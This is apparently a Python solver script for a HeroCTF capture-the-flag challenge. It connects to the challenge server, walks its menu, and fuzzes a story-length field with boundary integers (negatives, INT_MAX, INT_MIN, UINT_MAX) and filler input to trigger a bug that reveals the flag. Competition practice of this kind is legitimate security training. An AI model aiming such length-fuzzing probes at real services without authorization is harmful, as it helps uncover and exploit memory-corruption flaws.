#!/usr/bin/env python3
import socket
import time
import struct

def test_length(length_val):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    
    try:
        s.connect(('dyn06.heroctf.fr', 13683))
        
        def recv_until(s, text, max_bytes=4096):
            data = b''
            count = 0
            while text not in data and count < max_bytes:
                try:
                    chunk = s.recv(1024)
                    if not chunk:
                        break
                    data += chunk
                    count += len(chunk)
                except socket.timeout:
                    break
            return data.decode('utf-8', errors='ignore')
        
        recv_until(s, b'> ', 500)
        s.send(b'1\n')
        recv_until(s, b': ', 500)
        
        # Enviar longitud
        length_str = str(length_val) + '\n'
        s.send(length_str.encode())
        
        response = recv_until(s, b': ', 1000)
        print(f"Length {length_val}: {response[:200]}")
        
        if 'Invalid' not in response and 'Now type' in response:
            # Enviar historia
            story = "A" * min(1000, abs(length_val) if length_val > 0 else 100)
            s.send(story.encode() + b'\n')
            time.sleep(0.5)
            result = recv_until(s, b'> ', 2000)
            
            s.send(b'4\n')
            time.sleep(0.5)
            results = recv_until(s, b'> ', 2000)
            
            if 'Hero{' in results:
                print(f"\n*** FLAG FOUND with length {length_val} ***")
                print(results)
                return True
    except Exception as e:
        pass
    finally:
        s.close()
    return False

# Probar diferentes longitudes
lengths = [
    -1, -10, -100, -1000,
    0, 1, 10, 32, 64, 65, 100, 128, 256, 512, 1024,
    2147483647, -2147483648,  # INT_MAX, INT_MIN
    4294967295,  # UINT_MAX
    999999999,
]

for length in lengths:
    print(f"Testing length: {length}")
    if test_length(length):
        break
    time.sleep(0.3)
